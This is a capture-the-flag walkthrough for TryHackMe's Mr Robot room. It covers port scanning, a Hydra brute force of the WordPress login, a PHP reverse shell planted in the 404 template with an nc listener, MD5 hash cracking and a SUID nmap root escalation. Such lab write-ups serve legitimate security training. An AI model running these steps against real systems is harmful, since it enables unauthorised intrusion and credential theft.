# Mr Robot CTF

Link: [Mr Robot CTF](https://tryhackme.com/room/mrrobot)

## High-Level Overview

This is a challenge machine styled after the TV show Mr. Robot. Our goal is to get root and find three flags hidden on this machine.

## Tools Needed

* Nmap
* Gobuster
* Burp Suite
* Hydra
* PHP Reverse Shell
* NC Listener
* John The Ripper

## Walkthrough

Upon starting the machine, we can do an initial scan using `nmap` by running the command:

```bash
$ sudo nmap -sS -A -Pn -p- MACHINE:IP -vv -T4
$ sudo nmap -sU -Pn -p- MACHINE:IP -vv -T4
```

Upon completion of the scan, we have identified the following ports and services:

* 22 - port appears closed but the service running has been identified as SSH
* 80 - port open with possible HTTP service running
* 443 - port open with possible HTTPS service running

Opening a web browser we can go to `http://MACHINE:IP/80` and we can see there is a live web application.

Having identified a web application, we should run `gobuster` in order to identify some interesting pages that could leak information. We will use the command below:

```bash
$ gobuster dir -k -u http://MACHINE:IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

There were some interesting results, such as the pages `/admin` and `/robots.txt`.

On the web page `'http://MACHINE:IP/robots.txt` we find a reference to two files, `key-1-of-3.txt` and `fsocity.dic`. We can access the first file by opening `http://MACHINE:IP/key-1-of-3.txt`, and there we can see the first flag which we need in order to complete the challenge. The second file looks like a dictionary file that might prove useful later. We can download it by either opening the url `http://MACHINE:IP/fsocity.dic` or using a CLI utility such as `wget` using the command `wget http://MACHINE:IP/fsocity.dic`.

Additionally, we have identified that the application is made using wordpress and it has a login page located at `http://MACHINE:IP/wp-login.php`

Sending a login request and capturing it with `burp` we can see the contents of the form use those in crafting a command using `hydra`.

```
log=Elliot&pwd=1234&wp-submit=Log+In&redirect_to=http%3A%2F%2FMACHINE:IP%2Fwp-admin%2F&testcookie=1
```

We also need a username for this application. Seems like if we try the username `Elliot`, the login page tells us that this user exists, however it has a different password.

We will use Hydra to see if we can find the right password using brute force, by using the command below:

```bash
$ hydra MACHINE:IP -f -vV -t 8 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FMACHINE:IP%2Fwp-admin%2F&testcookie=1:incorrect" -l Elliot -P fsocity.dic
```

Output:

```
[80][http-post-form] host: MACHINE:IP   login: Elliot   password: ER28-0652
```

Upon successfully logging in we are greeted with the wp-admin dashboard. Seems like this user is the administrator of the application.

We then proceed to examine the functionality of the web application to find a way into the server.

Checking for the version of this web application, we see that the current version is 3.4.1. This is good news for us, since this version is vulnerable to remote code execution and we can get the exploit to obtain a reverse shell from pentestmonkey [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Just need to change the `ip` variable to whatever your VPN IP is, and additionally change the `port` to a more convenient one.

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'MACHINE:IP';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

On the web application, going to `Appearance` -> `Editor`, we go to the right side of the screen and click on `404 Template`. Here we remove the contents and insert our modified reverse shell.

We save the file edits, then we set up a nc listener on our attacking machine to catch incoming connection attempts after uploading the exploit.

```bash
$ nc -lvnp 80
```

We then go to the url `http://MACHINE:IP/random-string`, or anything else that would trigger a 404 response.

And now we have a reverse shell!

We then next attempt to stabilize the shell and turn it into a proper terminal using the commands below:

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=screen
# CTRL+Z
$ stty raw -echo;fg
$ nc -lvnp 80
```

Once we are connected to the machine, we can see that in the `/home/robot` directory we have a file named `key-2-of-3.txt`. This is our second flag.

We cannot access it, but we notice that in the same folder there is a file named `password.raw-md5` that contains the hash `robot:c3fcd3d76192e4007dfb496cca67e13b`.

We will save the contents to a file on the attacking machine named `hash.txt`. We will check if this is indeed an MD5 hash, and then we will let John the Ripper have a crack at it and find the password.

```bash
$ hash-identifier c3fcd3d76192e4007dfb496cca67e13b
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5
```

And we have identified the password as being `abcdefghijklmnopqrstuvwxyz (robot)`. We see that we are currently logged in as `daemon`, and with the new password we can switch users to `robot` and then we can find out the contents of the file `key-2-of-3.txt`.

```bash
$ su robot
$ cat /home/robot/key-2-of-3.txt
```

To find the final flag, we should see about escalating privileges in order to have full search permission for the file system. We will be looking for SUID binaries using the command below:

```bash
$ find / -perm +6000 2>/dev/null | grep '/bin/'
```

We can see there is a binary `/usr/local/bin/nmap` that has the SUID bit set.

We can exploit this binary using the set of commands below in order to explore the `root` folder and retrieve our last flag.

```bash
$ /usr/local/bin/nmap --interactive
# inside the nmap session we can type in the following to get a root shell
> !sh
cd /root/
cat key-3-of-3.txt
```